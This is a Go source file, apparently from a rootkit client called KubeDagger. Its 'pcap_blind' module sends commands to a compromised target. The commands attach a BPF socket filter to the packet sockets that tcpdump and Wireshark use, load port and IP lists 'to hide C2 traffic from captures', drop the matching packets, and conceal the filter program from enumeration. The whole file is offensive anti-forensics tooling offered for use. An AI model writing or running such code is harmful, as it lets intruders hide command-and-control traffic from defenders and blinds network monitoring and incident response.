package pcap_blind

import (
	"encoding/json"
	"fmt"
	"os"

	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/shared"
)

type PcapBlindResult struct {
	Actions []shared.ActionInfo `json:"actions"`
	Success bool                `json:"success"`
}

func Execute(target, hidePorts, hideIPs, output string) error {
	result := &PcapBlindResult{}

	actions := []struct {
		name   string
		detail string
		cmd    string
	}{
		{
			"attach_af_packet_filter",
			"attach socket filter to AF_PACKET sockets used by tcpdump/Wireshark",
			"pcap_attach_filter",
		},
		{
			"configure_port_filter",
			"load port list into BPF map for packet drop decisions",
			"pcap_set_ports",
		},
		{
			"configure_ip_filter",
			"load IP list into BPF map to hide C2 traffic from captures",
			"pcap_set_ips",
		},
		{
			"enable_packet_drop",
			"activate filter to drop matching packets before they reach capture tools",
			"pcap_enable_drop",
		},
		{
			"hide_bpf_filter_program",
			"conceal the socket filter from BPF program enumeration",
			"pcap_hide_program",
		},
	}

	for _, a := range actions {
		cmd := a.cmd + "#" + hidePorts + "#" + hideIPs
		status := shared.SendCommand(target, "/pcap_blind", cmd)
		result.Actions = append(result.Actions, shared.ActionInfo{
			Name:   a.name,
			Status: status,
			Detail: a.detail,
		})
	}

	result.Success = shared.AllSucceeded(result.Actions)

	data, _ := json.MarshalIndent(result, "", "  ")
	if output != "" {
		return os.WriteFile(output, data, 0644)
	}
	fmt.Println(string(data))
	return nil
}
